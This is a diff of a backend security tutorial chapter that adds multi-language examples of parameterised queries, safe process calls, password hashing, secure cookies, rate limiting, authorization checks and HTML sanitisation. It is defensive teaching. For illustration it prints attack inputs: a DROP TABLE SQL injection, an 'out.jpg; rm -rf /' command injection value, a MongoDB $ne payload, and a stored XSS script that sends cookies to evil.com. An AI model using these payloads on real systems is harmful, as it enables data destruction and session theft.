@@ -2,7 +2,7 @@
 order: 17
 title: "Backend Security"
 navTitle: "Backend Security"
-summary: "Chapter 17 of Backend from First Principles: Backend Security."
+summary: "Almost every attack is the same mistake: data from a user being treated as code or as trusted. Injection, password storage, session cookies, rate limiting, BOLA and BFLA, XSS and CSRF, security headers, OAuth/OIDC and TLS, each one built from the attack backwards. Worked implementations in Go, Python, JavaScript, TypeScript and Java."
 readingTime: "2-3 hours"
 keywords:
   - "security"
@@ -86,8 +86,8 @@ SQL injection has been the #1 most destructive vulnerability for decades. It wor
 
 Consider a login query built by concatenation:
 
-```sql
-SQL / Vulnerable (Never Do This)-- Template on server:
+```sql title="Vulnerable, never do this"
+-- Template on server:
 SELECT * FROM users WHERE email = '' + userInput + ''
 
 -- Happy path (Alice logs in normally):
@@ -121,8 +121,12 @@ SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
 
 Instead of building one string with everything mashed together, send **two separate things** to the database: (1) the query template with placeholder slots, (2) the user data as separate arguments. The database driver guarantees that whatever goes into a slot is treated as a pure string, never as executable SQL.
 
-```go
-Go / pgx parameterised query//NEVER, string concatenation
+Go Python JavaScript TypeScript Java
+
+the value travels beside the query, never inside it
+
+```go title="pgx parameterised query"
+//NEVER, string concatenation
 query := "SELECT * FROM users WHERE email = '" + userInput + "'"
 
 // ALWAYS, parameterised ($1 is the slot)
@@ -133,6 +137,79 @@ row := db.QueryRow(ctx,
 
 // With an ORM (GORM), parameterised automatically
 db.Where("email = ?", userInput).First(&user)
+```
+
+```python title="psycopg parameterised query"
+# NEVER, f-string interpolation
+query = f"SELECT * FROM users WHERE email = '{user_input}'"
+
+# ALWAYS, parameterised (%s is the SLOT, not Python formatting)
+cur.execute(
+    "SELECT id, name FROM users WHERE email = %s",
+    (user_input,),  # a TUPLE; the driver escapes it, injection is impossible
+)
+
+# The trailing comma matters: ("x") is a string, ("x",) is a one-tuple.
+# Forget it and psycopg raises, which is the good outcome.
+
+# With an ORM (SQLAlchemy), parameterised automatically
+session.query(User).filter(User.email == user_input).first()
+```
+
+```js title="node-postgres parameterised query"
+// NEVER, template literal. This is THE JavaScript version of the
+// mistake, and it is four characters away from the safe line below.
+const query = `SELECT * FROM users WHERE email = '${userInput}'`
+
+// ALWAYS, parameterised ($1 is the slot, values go in the array)
+const { rows } = await db.query(
+  'SELECT id, name FROM users WHERE email = $1',
+  [userInput], // passed separately, treated purely as data
+)
+
+// With an ORM (Prisma), parameterised automatically
+await prisma.user.findFirst({ where: { email: userInput } })
+```
+
+```ts title="node-postgres parameterised query"
+// TypeScript does not stop the injection on its own, and it is worth
+// being clear about that: both lines below type-check perfectly.
+const bad = `SELECT * FROM users WHERE email = '${userInput}'` // still a hole
+
+// What it CAN do is make the safe path the only ergonomic one. A tagged
+// template collects the interpolations as PARAMETERS rather than
+// splicing them into the string, so the natural-looking syntax is the
+// safe one. `sql` here is from a library such as postgres.js or slonik.
+const rows = await sql<User[]>`
+  SELECT id, name FROM users WHERE email = ${userInput}
+`
+// -> sent as: SELECT id, name FROM users WHERE email = $1, [userInput]
+
+// Plain pg, typed by the row shape rather than the query text:
+const { rows } = await db.query<User>(
+  'SELECT id, name FROM users WHERE email = $1',
+  [userInput],
+)
+```
+
+```java title="JdbcClient parameterised query"
+// NEVER, string concatenation
+String query = "SELECT * FROM users WHERE email = '" + userInput + "'";
+
+// ALWAYS, parameterised (? is the slot)
+Optional<User> user = db.sql("SELECT id, name FROM users WHERE email = ?")
+    .param(userInput) // passed separately, treated purely as data
+    .query(User.class)
+    .optional();
+
+// JPA: a NAMED parameter, same rule
+em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
+  .setParameter("email", userInput)
+  .getSingleResult();
+
+// The Java-specific trap: String.format looks tidier than concatenation
+// and is exactly as dangerous. There is no formatting that escapes SQL.
+//   String.format("SELECT * FROM users WHERE email = '%s'", userInput)
 ```
 
 <Callout type="info">
@@ -147,8 +224,8 @@ Even if a SQL injection succeeds, you can limit the blast radius. The database u
 
 MongoDB queries are JSON objects, not SQL strings. But they support _operators_ (prefixed with `$`) like `$ne` (not equal), `$gt`, `$exists`. If you pass raw user-supplied JSON directly to a query, an attacker can inject these operators:
 
-```text
-JavaScript / MongoDB Injection//VULNERABLE: attacker sends {"$ne": null} as email
+```js title="MongoDB injection"
+//VULNERABLE: attacker sends {"$ne": null} as email
 db.users.find({ email: req.body.email })
 // Becomes: { email: { $ne: null } }  -> returns ALL users
 
@@ -167,8 +244,8 @@ Command injection is SQL injection at the OS level. Your backend sometimes needs
 
 ### The Attack
 
-```text
-Shell / Vulnerable Image Resize# User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"
+```bash title="vulnerable image resize"
+# User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"
 ffmpeg -i input.jpg -vf scale=800:600 out.jpg; rm -rf /
 #                                       ^ ffmpeg done  ^ now this runs
 
@@ -191,8 +268,12 @@ Shell special characters that enable this:
 
 Every language provides functions that accept the _command_ and _arguments_ as separate parameters. These pass arguments directly to the process without going through a shell interpreter, so special characters are never interpreted.
 
-```go
-Go / exec.Command (safe)import "os/exec"
+Go Python JavaScript TypeScript Java
+
+the command and its arguments are separate values, so no shell parses them
+
+```go title="exec.Command, safe"
+import "os/exec"
 
 //VULNERABLE, passes through shell interpreter
 cmd := exec.Command("sh", "-c", "ffmpeg -i input.jpg -o "+userFilename)
@@ -208,8 +289,8 @@ cmd := exec.Command(
 output, err := cmd.Output()
 ```
 
-```text
-Python / subprocess (safe)import subprocess
+```python title="subprocess, safe"
+import subprocess
 
 #VULNERABLE, shell=True sends everything through sh
 subprocess.run(f"ffmpeg -i input.jpg -o {user_filename}", shell=True)
@@ -220,6 +301,76 @@ subprocess.run([
     "-vf", "scale=800:600",
     user_filename   # just a string, not interpreted
 ], check=True)
+```
+
+```js title="execFile, safe"
+import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+
+// VULNERABLE: exec() runs the string through /bin/sh
+import { exec } from 'node:child_process'
+exec(`ffmpeg -i input.jpg -o ${userFilename}`)
+
+// SAFE: execFile takes the program and an ARRAY of arguments.
+// No shell is spawned, so ; && $() and friends have no meaning.
+await promisify(execFile)('ffmpeg', [
+  '-i', 'input.jpg',
+  '-vf', 'scale=800:600',
+  userFilename, // treated as one argument, not shell code
+])
+
+// spawn() is the same rule. The one thing to never do is pass
+// `{ shell: true }`, which puts the shell right back in the path.
+```
+
+```ts title="execFile, safe"
+import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+
+const run = promisify(execFile)
+
+// Types cannot tell a safe string from a dangerous one, but they CAN
+// make the shape of the safe call the only one available. A function
+// that takes `args: string[]` simply has nowhere to put a shell string.
+async function resize(inputPath: string, outputPath: string): Promise<void> {
+  await run('ffmpeg', [
+    '-i', inputPath,
+    '-vf', 'scale=800:600',
+    outputPath,
+  ])
+}
+
+// Worth saying plainly: argument separation stops SHELL injection, not
+// ARGUMENT injection. A filename beginning with "-" is still read by
+// ffmpeg as a flag. Validate the value as well as passing it safely:
+if (!/^[\w.-]+$/.test(userFilename) || userFilename.startsWith('-')) {
+  throw new Error('invalid filename')
+}
+```
+
+```java title="ProcessBuilder, safe"
+// VULNERABLE: the single-String form of Runtime.exec, and worse, any
+// version that hands the string to a shell.
+Runtime.getRuntime().exec("ffmpeg -i input.jpg -o " + userFilename);
+
+// SAFE: ProcessBuilder takes the program and each argument separately.
+// Java never invokes a shell here, so shell metacharacters are inert.
+ProcessBuilder pb = new ProcessBuilder(
+    "ffmpeg",
+    "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    userFilename   // one argument, not shell code
+);
+pb.redirectErrorStream(true);
+Process process = pb.start();
+
+// Always consume the output stream and wait with a TIMEOUT. A process
+// whose pipe buffer fills up blocks forever, and waitFor() with no
+// timeout then hangs the calling thread for good.
+String output = new String(process.getInputStream().readAllBytes());
+if (!process.waitFor(30, TimeUnit.SECONDS)) {
+    process.destroyForcibly();
+}
 ```
 
 <Callout type="info">
@@ -259,8 +410,12 @@ General-purpose hash functions (SHA-256, MD5) are designed to be _fast_. A GPU c
 **Industry standard today:** use `Argon2id` (winner of the Password Hashing Competition). Fallback: bcrypt with cost factor >=12. Never use SHA-256, MD5, or SHA-1 for passwords.
 </Callout>
 
-```go
-Go / Argon2id (golang.org/x/crypto)import (
+Go Python JavaScript TypeScript Java
+
+a random salt per password, a deliberately slow hash, a constant-time compare
+
+```go title="Argon2id / golang.org/x/crypto"
+import (
     "crypto/rand"
     "golang.org/x/crypto/argon2"
     "encoding/base64"
@@ -290,6 +445,130 @@ func VerifyPassword(password, stored string) bool {
 }
 ```
 
+```python title="Argon2id / argon2-cffi"
+from argon2 import PasswordHasher
+from argon2.exceptions import VerifyMismatchError
+
+# The library owns the parameters, the salt and the encoding. That is
+# the point: every one of those is a chance to get it wrong by hand.
+ph = PasswordHasher(
+    time_cost=1,        # iterations
+    memory_cost=64*1024, # 64 MB
+    parallelism=4,
+    hash_len=32,
+)
+
+
+def hash_password(password: str) -> str:
+    # A random salt is generated internally and embedded in the output
+    # string, so there is nothing separate to store.
+    return ph.hash(password)  # -> $argon2id$v=19$m=65536,t=1,p=4$...
+
+
+def verify_password(password: str, stored: str) -> bool:
+    try:
+        ph.verify(stored, password)  # constant-time internally
+    except VerifyMismatchError:
+        return False
+
+    # Bonus: if the stored hash used weaker parameters than today's
+    # settings, transparently upgrade it on successful login.
+    if ph.check_needs_rehash(stored):
+        save_new_hash(ph.hash(password))
+
+    return True
+```
+
+```js title="Argon2id / node:crypto"
+import { randomBytes, scrypt, timingSafeEqual } from 'node:crypto'
+import { promisify } from 'node:util'
+import argon2 from 'argon2'
+
+// Argon2id, via the argon2 package. Salt, parameters and encoding are
+// all handled for you and embedded in the returned string.
+export async function hashPassword(password) {
+  return argon2.hash(password, {
+    type: argon2.argon2id,
+    timeCost: 1,
+    memoryCost: 64 * 1024, // 64 MB
+    parallelism: 4,
+  })
+}
+
+export async function verifyPassword(password, stored) {
+  // Constant-time internally; never compare hashes with ===
+  return argon2.verify(stored, password)
+}
+
+// If you cannot add a dependency, scrypt is in the standard library and
+// is an acceptable second choice. bcrypt is the third. What is NOT
+// acceptable is any general-purpose hash, crypto.createHash('sha256')
+// is fast by design, which is precisely the wrong property here.
+```
+
+```ts title="Argon2id / argon2"
+import argon2 from 'argon2'
+
+// A branded type is a small trick with a real payoff: a PasswordHash is
+// no longer interchangeable with any other string, so a function that
+// stores hashes cannot be handed a plaintext password by accident, and
+// a log statement that takes a `string` will not silently accept one.
+type PasswordHash = string & { readonly __brand: 'PasswordHash' }
+
+const OPTIONS = {
+  type: argon2.argon2id,
+  timeCost: 1,
+  memoryCost: 64 * 1024, // 64 MB
+  parallelism: 4,
+} as const
+
+export async function hashPassword(password: string): Promise<PasswordHash> {
+  return (await argon2.hash(password, OPTIONS)) as PasswordHash
+}
+
+export async function verifyPassword(
+  password: string,
+  stored: PasswordHash,
+): Promise<boolean> {
+  try {
+    return await argon2.verify(stored, password) // constant-time internally
+  } catch {
+    return false // a malformed stored hash must not throw into the handler
+  }
+}
+```
+
+```java title="Argon2id / Spring Security"
+// Spring Security ships the encoder, and using it rather than calling a
+// hashing library directly buys one specific thing: DelegatingPasswordEncoder
+// prefixes each hash with the algorithm that produced it, so you can
+// migrate from bcrypt to Argon2 without a flag day.
+@Bean
+PasswordEncoder passwordEncoder() {
+    // saltLength=16, hashLength=32, parallelism=4, memory=64MB, iterations=1
+    return new Argon2PasswordEncoder(16, 32, 4, 64 * 1024, 1);
+}
+
+@Service
+public class PasswordService {
+    private final PasswordEncoder encoder;
+
+    public String hashPassword(String password) {
+        // The random salt is generated internally and embedded in the output
+        return encoder.encode(password);
+    }
+
+    public boolean verifyPassword(String password, String stored) {
+        // Constant-time internally; never use String.equals on hashes,
+        // it short-circuits on the first differing byte and leaks timing.
+        return encoder.matches(password, stored);
+    }
+}
+
+// Argon2PasswordEncoder needs BouncyCastle on the classpath:
+//   implementation 'org.bouncycastle:bcprov-jdk18on'
+```
+
 06
 
 ## Sessions, Cookies & the Critical Flags
@@ -313,8 +592,12 @@ After a user authenticates, you need to remember them across requests. This is d
 | **Secure**   | `true`            | Cookie only sent over HTTPS              | Session stolen by Wi-Fi eavesdropper or Wireshark |
 | **SameSite** | `Strict` or `Lax` | Cookie not sent in cross-origin requests | CSRF attacks can use your cookie from evil.com    |
 
-```text
-Go / Secure Cookiehttp.SetCookie(w, &http.Cookie{
+Go Python JavaScript TypeScript Java
+
+HttpOnly, Secure, SameSite: three flags, three whole attack classes
+
+```go title="the secure cookie"
+http.SetCookie(w, &http.Cookie{
     Name:     "session_id",
     Value:    sessionID,
     HttpOnly: true,          // JS cannot access
@@ -323,6 +606,82 @@ Go / Secure Cookiehttp.SetCookie(w, &http.Cookie{
     MaxAge:   7 * 24 * 3600, // 7 days
     Path:     "/",
 })
+```
+
+```python title="the secure cookie"
+response.set_cookie(
+    key="session_id",
+    value=session_id,
+    httponly=True,      # JS cannot access
+    secure=True,        # HTTPS only
+    samesite="strict",  # no cross-site
+    max_age=7 * 24 * 3600,  # 7 days
+    path="/",
+)
+```
+
+```js title="the secure cookie"
+res.cookie('session_id', sessionId, {
+  httpOnly: true,   // JS cannot access
+  secure: true,     // HTTPS only
+  sameSite: 'strict', // no cross-site
+  maxAge: 7 * 24 * 3600 * 1000, // 7 days, in MILLISECONDS here
+  path: '/',
+})
+
+// Two Express-specific traps:
+//  1. maxAge is milliseconds, unlike the Set-Cookie header's seconds.
+//     Copying 604800 across gives you a ten-minute session.
+//  2. `secure: true` behind a reverse proxy needs app.set('trust proxy', 1),
+//     or Express sees plain HTTP and silently refuses to set the cookie.
+```
+
+```ts title="the secure cookie"
+import type { CookieOptions, Response } from 'express'
+
+// Defining the options ONCE, as a typed constant, is the point. Cookie
+// flags are set in several places (login, refresh, logout) and the one
+// that quietly omits `httpOnly` is the one that gets exploited.
+const SESSION_COOKIE: CookieOptions = {
+  httpOnly: true,     // JS cannot access, so an XSS cannot steal it
+  secure: true,       // HTTPS only, so it cannot leak in cleartext
+  sameSite: 'strict', // no cross-site, which is most of CSRF gone
+  maxAge: 7 * 24 * 3600 * 1000, // 7 days, in milliseconds
+  path: '/',
+}
+
+export function setSession(res: Response, sessionId: string): void {
+  res.cookie('session_id', sessionId, SESSION_COOKIE)
+}
+
+// Clearing must repeat the SAME path and flags, or the browser treats
+// it as a different cookie and the old one survives the logout.
+export function clearSession(res: Response): void {
+  res.clearCookie('session_id', { ...SESSION_COOKIE, maxAge: undefined })
+}
+```
+
+```java title="the secure cookie"
+ResponseCookie cookie = ResponseCookie.from("session_id", sessionId)
+    .httpOnly(true)       // JS cannot access
+    .secure(true)         // HTTPS only
+    .sameSite("Strict")   // no cross-site
+    .maxAge(Duration.ofDays(7))
+    .path("/")
+    .build();
+
+response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+
+// Use ResponseCookie, not the older javax/jakarta Cookie class: that one
+// has no SameSite setter at all, so code using it silently ships without
+// the flag that does most of the CSRF work.
+
+// With Spring Session the same thing is configuration rather than code:
+//   server.servlet.session.cookie:
+//     http-only: true
+//     secure: true
+//     same-site: strict
+//     max-age: 7d
 ```
 
 <Callout type="info">
@@ -383,8 +742,12 @@ Without rate limiting, an attacker can send millions of login attempts per secon
 <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="rl" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker></defs><rect x="20" y="30" width="180" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="110" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 1: Per-IP</text><text x="110" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">10 attempts / minute</text><text x="110" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassed by botnets / rotating IPs</text><line x1="202" y1="65" x2="238" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="240" y="30" width="200" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="340" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 2: Per-Account</text><text x="340" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">5 failures -> lock 24h</text><text x="340" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassed by password spray</text><line x1="442" y1="65" x2="478" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="480" y="30" width="180" height="70" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="570" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 3: Global</text><text x="570" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">100 failures / min system-wide</text><text x="570" y="89" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Alert + CAPTCHA all users</text><rect x="20" y="130" width="640" height="46" rx="8" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="340" y="152" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Password Spray Attack</text><text x="340" y="168" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">Try one common password ("123456") across millions of accounts -> avoids per-account lockout. Only global rate limiting catches this.</text></svg>
 </Diagram>
 
-```go
-Go / Rate Limiting with golang.org/x/time/rateimport (
+Go Python JavaScript TypeScript Java
+
+a token bucket per IP, checked before the handler runs
+
+```go title="rate limiting / golang.org/x/time/rate"
+import (
     "golang.org/x/time/rate"
     "sync"
     "net/http"
@@ -419,6 +782,120 @@ func RateLimitMiddleware(next http.Handler) http.Handler {
 }
 ```
 
+```python title="rate limiting / slowapi"
+from slowapi import Limiter, _rate_limit_exceeded_handler
+from slowapi.errors import RateLimitExceeded
+from slowapi.util import get_remote_address
+
+limiter = Limiter(key_func=get_remote_address)
+app.state.limiter = limiter
+app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
+
+
+# The strictest limit belongs on the endpoints an attacker actually
+# targets: login, password reset, signup. A global limit generous enough
+# for browsing is far too generous for credential stuffing.
+@app.post("/login")
+@limiter.limit("5/minute")
+async def login(request: Request, body: LoginRequest):
+    ...
+
+
+# For a multi-instance deployment, back it with Redis so the limit is
+# shared rather than per-process:
+#   Limiter(key_func=get_remote_address, storage_uri="redis://localhost:6379")
+```
+
+```js title="rate limiting / express-rate-limit"
+import rateLimit from 'express-rate-limit'
+import RedisStore from 'rate-limit-redis'
+
+const loginLimiter = rateLimit({
+  windowMs: 60_000, // 1 minute
+  limit: 5,         // 5 attempts per IP per window
+  standardHeaders: 'draft-7', // RateLimit-* response headers
+  legacyHeaders: false,
+
+  // Without a shared store this is PER PROCESS: five instances means
+  // five times the limit, and an attacker only has to be unlucky once.
+  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
+})
+
+app.post('/login', loginLimiter, loginHandler)
+
+// Behind a proxy, set app.set('trust proxy', 1) so req.ip is the real
+// client and not the load balancer, otherwise every request shares one
+// bucket and the limiter takes your whole site down instead.
+```
+
+```ts title="rate limiting / express-rate-limit"
+import rateLimit, { type Options } from 'express-rate-limit'
+
+// Three tiers, declared as data. The reason to write it this way is that
+// the numbers become reviewable in one place: it is very easy to protect
+// /login carefully and leave /password-reset on the global limit.
+const TIERS = {
+  global: { windowMs: 60_000, limit: 100 },
+  auth: { windowMs: 60_000, limit: 5 },
+  expensive: { windowMs: 60_000, limit: 10 },
+} as const satisfies Record<string, Pick<Options, 'windowMs' | 'limit'>>
+
+function limiter(tier: keyof typeof TIERS) {
+  return rateLimit({
+    ...TIERS[tier],
+    standardHeaders: 'draft-7',
+    legacyHeaders: false,
+    store: new RedisStore({ sendCommand: (...a: string[]) => redis.sendCommand(a) }),
+    // Key by ACCOUNT as well as IP on auth routes. An attacker spraying
+    // one password across many accounts from many IPs defeats a pure
+    // per-IP limit entirely, which is how credential stuffing works.
+    keyGenerator: (req) =>
+      tier === 'auth' ? `${req.ip}:${String(req.body?.email ?? '')}` : (req.ip ?? 'unknown'),
+  })
+}
+
+app.use(limiter('global'))
+app.post('/login', limiter('auth'), loginHandler)
+app.post('/password-reset', limiter('auth'), resetHandler)
+```
+
+```java title="rate limiting / Bucket4j"
+// Bucket4j is a token bucket, the same algorithm as the Go tab, and it
+// has a Redis-backed mode so the limit is shared across instances.
+@Component
+public class RateLimitFilter extends OncePerRequestFilter {
+    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
+
+    // Per-IP: 5 requests per second, burst of 10
+    private Bucket newBucket() {
+        return Bucket.builder()
+            .addLimit(limit -> limit.capacity(10).refillGreedy(5, Duration.ofSeconds(1)))
+            .build();
+    }
+
+    @Override
+    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
+                                    FilterChain chain)
+            throws ServletException, IOException {
+        String ip = clientIp(req);
+        Bucket bucket = buckets.computeIfAbsent(ip, k -> newBucket());
+
+        if (!bucket.tryConsume(1)) {
+            res.setHeader("Retry-After", "1");
+            res.sendError(429, "too many requests");
+            return; // the controller never runs
+        }
+
+        chain.doFilter(req, res);
+    }
+}
+
+// The in-memory map above has the same flaw the Go tab does, and it is
+// worth naming: nothing ever removes entries, so it grows with every
+// distinct IP until the process runs out of heap. Use an eviction cache
+// (Caffeine with expireAfterAccess) or a Redis-backed proxy manager.
+```
+
 09
 
 ## Authorization Vulnerabilities: BOLA & BFLA
@@ -439,8 +916,8 @@ _(Also called IDOR, Insecure Direct Object Reference)_
 
 User A can access, modify, or delete the resources of User B by guessing or iterating their IDs.
 
-```sql
-SQL / BOLA Fix--VULNERABLE: fetches invoice 5 regardless of who is asking
+```sql title="the BOLA fix"
+--VULNERABLE: fetches invoice 5 regardless of who is asking
 SELECT * FROM invoices WHERE id = $1
 
 -- FIXED: also requires the invoice to belong to the requesting user
@@ -461,8 +938,12 @@ Return **404 Not Found** (not 403 Forbidden) when a user requests a resource the
 
 A regular user accesses admin-only endpoints because role checks are missing at the routing layer. Believing "nobody knows the /admin URL" is **security through obscurity**: which is not security at all.
 
-```go
-Go / Role Middlewarefunc RequireRole(role string) func(http.Handler) http.Handler {
+Go Python JavaScript TypeScript Java
+
+the check lives in middleware, so no handler can forget it
+
+```go title="the role middleware"
+func RequireRole(role string) func(http.Handler) http.Handler {
     return func(next http.Handler) http.Handler {
         return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
             user, ok := r.Context().Value("user").(User)
@@ -478,6 +959,112 @@ Go / Role Middlewarefunc RequireRole(role string) func(http.Handler) http.Handle
 // Router setup
 r.With(RequireAuth, RequireRole("admin")).
   Get("/admin/invoices", adminInvoicesHandler)
+```
+
+```python title="the role dependency"
+from fastapi import Depends, HTTPException
+
+
+def require_role(role: str):
+    def checker(user: User = Depends(get_current_user)) -> User:
+        if user.role != role:
+            raise HTTPException(403, "forbidden")
+        return user
+    return checker
+
+
+# Router setup: the dependency runs BEFORE the handler body
+@app.get("/admin/invoices")
+async def admin_invoices(user: User = Depends(require_role("admin"))):
+    return await fetch_all_invoices()
+```
+
+```js title="the role middleware"
+export function requireRole(role) {
+  return (req, res, next) => {
+    const user = req.context?.user
+    if (!user || user.role !== role) {
+      return res.status(403).send('forbidden') // short-circuit
+    }
+    next()
+  }
+}
+
+// Router setup
+app.get('/admin/invoices', requireAuth, requireRole('admin'), adminInvoicesHandler)
+
+// The failure mode to design against is not a broken check, it is a
+// MISSING one: a new admin route added next month without the
+// middleware. Mounting the guard on the router rather than per route
+// makes forgetting it structurally impossible:
+//   const admin = Router()
+//   admin.use(requireAuth, requireRole('admin'))
+//   admin.get('/invoices', adminInvoicesHandler)
+//   app.use('/admin', admin)
+```
+
+```ts title="the role middleware"
+import { Router, type NextFunction, type Request, type Response } from 'express'
+
+type Role = 'admin' | 'user'
+
+// A union rather than `string` means requireRole('admni') does not
+// compile. A typo in a role name otherwise fails OPEN in the worst way:
+// nobody matches, so nobody gets in, until someone "fixes" it by
+// loosening the check.
+export function requireRole(role: Role) {
+  return (req: Request, res: Response, next: NextFunction): void => {
+    const user = req.context?.user
+    if (!user || user.role !== role) {
+      res.status(403).send('forbidden')
+      return
+    }
+    next()
+  }
+}
+
+// Mount the guard on the ROUTER, so every route under /admin inherits
+// it and a future route cannot be added without one.
+const admin = Router()
+admin.use(requireAuth, requireRole('admin'))
+admin.get('/invoices', adminInvoicesHandler)
+
+app.use('/admin', admin)
+```
+
+```java title="method security"
+// Spring Security expresses this as an annotation on the method, checked
+// by a proxy before the body runs.
+@Configuration
+@EnableMethodSecurity
+class SecurityConfig { }
+
+@RestController
+class AdminController {
+
+    @PreAuthorize("hasRole('ADMIN')")
+    @GetMapping("/admin/invoices")
+    List<Invoice> adminInvoices() {
+        return invoiceService.findAll();
+    }
+}
+
+// Better still, put it in the filter chain so the rule covers the whole
+// URL space rather than one method at a time. A route added later under
+// /admin/** is then protected the moment it exists:
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .authorizeHttpRequests(auth -> auth
+            .requestMatchers("/admin/**").hasRole("ADMIN")
+            .requestMatchers("/login", "/signup").permitAll()
+            .anyRequest().authenticated())   // deny by default, always
+        .build();
+}
+
+// `.anyRequest().authenticated()` is the line that matters most: it
+// makes the policy deny-by-default, so forgetting a rule for a new
+// endpoint locks it down rather than exposing it.
 ```
 
 ### The Horizontal vs Vertical Mental Model
@@ -520,8 +1107,8 @@ JavaScript running in your platform's context can:
 
 A user submits a comment/post containing a `<script>` tag. Your server stores it. Every user who views that post has the script execute in their browser.
 
-```text
-Stored XSS Attack<!-- Attacker submits this as a "comment" -->
+```html title="the stored XSS attack"
+<!-- Attacker submits this as a "comment" -->
 <script>
   // Steal session cookie and send to attacker's server
   fetch('https://evil.com/steal?c=' + document.cookie);
@@ -537,8 +1124,36 @@ Stored XSS Attack<!-- Attacker submits this as a "comment" -->
 
 Before storing any user-provided HTML/markdown, strip dangerous tags and attributes. Use a battle-tested library; never write your own sanitiser.
 
-```python
-Python / bleach sanitisationimport bleach
+Go Python JavaScript TypeScript Java
+
+an allow-list of tags, never a block-list of dangerous ones
+
+```go title="bluemonday sanitisation"
+import "github.com/microcosm-cc/bluemonday"
+
+// Build the policy ONCE at startup, not per request: compiling it is
+// the expensive part and the policy is safe to share.
+var commentPolicy = func() *bluemonday.Policy {
+    p := bluemonday.NewPolicy()
+    p.AllowElements("p", "b", "i", "em", "strong", "ul", "ol", "li")
+    p.AllowAttrs("href").OnElements("a")
+    // Without this, href="javascript:..." survives the tag allow-list
+    // and you have an XSS through a link.
+    p.RequireParseableURLs(true)
+    p.AllowURLSchemes("http", "https", "mailto")
+    return p
+}()
+
+func SanitiseComment(rawHTML string) string {
+    return commentPolicy.Sanitize(rawHTML)
+}
+
+// bluemonday.UGCPolicy() is a ready-made policy for user-generated
+// content and is a reasonable default if you do not want to enumerate.
+```
+
+```python title="bleach sanitisation"
+import bleach
 
 ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
 ALLOWED_ATTRS = {'a': ['href']}
@@ -557,12 +1172,83 @@ def sanitise_comment(raw_html: str) -> str:
 # <img onerror="..."> -> attribute stripped
 ```
 
+```js title="DOMPurify sanitisation"
+import createDOMPurify from 'dompurify'
+import { JSDOM } from 'jsdom'
+
+// DOMPurify needs a DOM. On the server, JSDOM provides one.
+const DOMPurify = createDOMPurify(new JSDOM('').window)
+
+const ALLOWED_TAGS = ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li']
+const ALLOWED_ATTR = ['href']
+
+export function sanitiseComment(rawHtml) {
+  return DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS, ALLOWED_ATTR })
+}
+
+// Do NOT write your own with a regex. HTML parsing is adversarial:
+// <img src=x onerror=alert(1)>, <svg/onload=...>, malformed tags that
+// browsers helpfully repair into working script. Every hand-rolled
+// "strip tags" function in history has been bypassed.
+```
+
+```ts title="DOMPurify sanitisation"
+import createDOMPurify from 'dompurify'
+import { JSDOM } from 'jsdom'
+
+const DOMPurify = createDOMPurify(new JSDOM('').window)
+
+// A branded type again, and here it earns its keep more than anywhere
+// else in this chapter: SafeHtml can only be produced by the sanitiser,
+// so a template that renders raw HTML can demand one and the compiler
+// will refuse any string that has not been through it.
+type SafeHtml = string & { readonly __brand: 'SafeHtml' }
+
+const CONFIG = {
+  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
+  ALLOWED_ATTR: ['href'],
+} as const
+
+export function sanitiseComment(rawHtml: string): SafeHtml {
+  return DOMPurify.sanitize(rawHtml, CONFIG) as SafeHtml
+}
+
+// render(html: SafeHtml) now cannot be called with req.body.comment,
+// which is the mistake this whole section exists to prevent.
+```
+
+```java title="OWASP Java HTML Sanitizer"
+import org.owasp.html.HtmlPolicyBuilder;
+import org.owasp.html.PolicyFactory;
+
+public final class CommentSanitiser {
+
+    // Built once; PolicyFactory is immutable and thread-safe.
+    private static final PolicyFactory POLICY = new HtmlPolicyBuilder()
+        .allowElements("p", "b", "i", "em", "strong", "ul", "ol", "li")
+        .allowElements("a")
